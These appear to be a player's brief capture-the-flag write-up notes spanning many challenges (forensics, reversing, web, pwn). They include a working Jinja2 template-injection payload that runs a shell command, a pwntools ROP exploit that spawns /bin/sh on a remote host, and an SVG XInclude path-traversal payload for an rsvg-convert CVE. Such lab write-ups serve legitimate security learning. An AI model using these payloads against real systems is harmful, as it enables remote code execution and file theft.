# wicked-firmware

q1 - run strings
q3 - in /etc/hosts/

# just-an-upload

filter for http
observe POSTs to upload.php
get data sent (PK -> zip)
get zip and obtain flag

# file-factory

q1 - open in ghidra and look for some func named main => main.main
q2 - search for file1.txt and see where it appears
q3 - wild guess, in main there are 2 func calls, createFile and copyFile, since createFile was for q2, this ought to be for q3
q4 - use apimonitor
q5 - use apimonitor

# pin

put file in Ghidra
see func that checks whether the pin is valid
make all bool vars true
respect last if
done

# threat-monitoring

q1 - filter for date and see weird packages sent to that host
q2 - see some requests that include the compromised domain in the req
q3 - get ip of host from q1

# secrets-secrets-secrets

analyze py script and see what pass it requires to decrypt the file (execute separately part of the code and see the output) => load_file
input that and get the flag from binary

# wicked-game

put it in bytecode viewer
analyze winning condition - it loads a bitmap
run apktool
see the graphic
zoom in below the android -.-

# wicked-monitoring

q1 - get compromised user (initially it was set to the guy who wrote PuTTy -.-, but it was changed after I pointed it out to the actual compromised user)
q2 - look through logs, plink.exe stands out
q3 - uses putty to connect to port 3389 => RDP

# bad-dev

sqli/xss don't work
analyzing responses, we see its a python server
testing ssti reveals its jinja2 templates
accessing builtins works => `{{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()%20}}`

# not-allowed

buffer overflow from `fgets` - check to see how much until we overwrite saved rip, and then we'll focus on some ROP
running `ROPGadget`, we see syscall, thus we'll use it to run `execve("/bin/sh", 0, 0)` (format is `execve(%rdi%, %rsi%, %rdx%)`, with `%rax% = 59`)
also, there's a wish function which gives us the "/bin/sh" string, nice, get addr of "/bin/sh" from there
thus, gather some gadgets to make `%rax% = 59`, `%rsi% = 0` and `%rdx%=0` and `%rdi%` to have the addr of "/bin/sh"
lastly, make sure stack is aligned upon syscall, that's what the filler is for

```Python
from pwn import *
wish = p64(0x00401175)
zero_rax = p64(0x0000000000401161)
zero_rdx = p64(0x000000000040116e)
zero_rsi = p64(0x00000000004011c4)
inc_rax = p64(0x00000000004011ce)
pop_rdi = p64(0x0000000000401156)
binsh = p64(0x0040407d)
syscall = p64(0x00000000004011cb)
filler = p64(0x000000000040101a)
overwrite = b"A" * 40
payload = overwrite + wish + zero_rax + zero_rsi + zero_rdx
for _ in range(59):
	payload += inc_rax
payload += (pop_rdi + binsh + filler + syscall)
#p = gdb.debug("./not-allowed", "br main")
p = remote("34.89.210.219", 31097)
p.sendline(payload)
p.interactive()

```

# profile-pic

seems to only manage to upload svgs with 50px by 50px
if it fails, we see that it uses `rsvg-convert`
search for cve-s for it, end up here: `https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/`
spent some time getting /etc/passwd searching for home of user with flag, ended up nowhere
used `ffuf` for file/directory enumeration and observed `flag.php`
read `flag.php` and got flag (vary `x` to get text)

```XML
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
	<svg width="50px" height="50px" xmlns:xi="http://www.w3.org/2001/XInclude">
	  <rect width="50px" height="50px" style="fill:rgb(255,204,204);" />
	  <text x="-600" y="30">
	    <xi:include
	      href=".?../../../../../../../var/www/html/flag.php"
	      parse="text"
	      encoding="ASCII"
	    >
	      <xi:fallback>file not found</xi:fallback>
	    </xi:include>
	  </text>
	</svg>
```
